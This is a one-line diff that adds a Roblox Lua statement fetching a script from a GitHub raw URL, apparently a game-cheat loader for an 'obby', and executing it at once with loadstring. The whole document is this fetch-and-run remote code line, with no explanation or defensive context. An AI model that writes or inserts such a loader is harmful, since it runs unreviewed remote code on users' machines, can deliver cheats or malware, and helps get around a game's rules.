@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/horneldersever24/loaders/main/loaders/hell-spiral-difficulty-chart-obby-spam3-wsvi290yo1qq0v.lua"))()
